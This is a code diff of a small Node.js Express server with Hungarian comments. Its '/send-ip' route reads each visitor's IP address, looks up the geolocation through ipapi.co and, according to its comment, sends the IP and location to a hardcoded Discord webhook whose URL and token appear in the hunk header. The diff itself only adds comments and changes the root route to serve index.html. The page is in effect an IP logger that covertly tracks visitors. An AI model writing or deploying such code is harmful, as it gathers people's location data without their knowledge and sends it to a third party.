@@ -8,8 +8,10 @@ const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Nd
 
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
+    // A látogató IP címének lekérése
     const userIp = req.ip || req.connection.remoteAddress;
 
+    // IP cím lekérdezése az ipapi API segítségével
     fetch(`https://ipapi.co/${userIp}/json/`)
         .then(geoResponse => geoResponse.json())
         .then(geoData => {
@@ -42,19 +44,7 @@ app.get('/send-ip', (req, res) => {
 
 // A gyökér útvonal beállítása
 app.get('/', (req, res) => {
-    res.send('Weboldal elérhető!');
-});
-
-// Szerver indítása
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
-});
-
-
-
-// Alapértelmezett route, amely a gyökér URL-ről a 'index.html'-t szolgáltatja ki
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(__dirname + '/index.html'); // Az index.html fájl kiszolgálása
 });
 
 // Szerver indítása
